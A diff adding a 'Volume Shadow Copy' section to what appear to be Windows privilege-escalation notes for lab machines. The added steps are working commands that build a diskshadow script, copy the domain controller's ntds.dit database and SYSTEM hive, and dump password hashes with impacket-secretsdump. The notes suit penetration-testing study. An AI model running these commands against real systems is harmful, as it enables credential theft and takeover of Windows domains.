@@ -82,6 +82,39 @@
 
     type C:\Users\Public\root.txt
 
+## Alternate Method: Volume Shadow Copy
+
+#### 1) On our machine, create a .dsh file that will automate the process.
+
+    nano pwn.dsh
+
+#### 2) File contents
+
+    set context persistent nowriters
+    add volume c: alias pwn
+    create
+    expose %pwn% z:
+
+#### 3) Convert the file to a Windows-compatible format
+
+    unix2dos pwn.dsh
+
+#### 4) Upload the file, then run it with diskshadow
+
+    diskshadow /s pwn.dsh
+
+#### 5) Transfer the ntds.dit file from Z: to Temp directory
+
+    robocopy /b z:\windows\ntds . ntds.dit
+
+#### 6) Extract the SYSTEM hive, then download it for offline hash dumping with impacket
+
+    reg save hklm\system c:\Temp\system
+
+#### 7) Dump hashes
+
+    impacket-secretsdump -ntds ntds.dit -system system local
+
 ## SeTakeOwnership
 
 #### Essentially, we can take ownership of a service running as SYSTEM and elevate privileges.
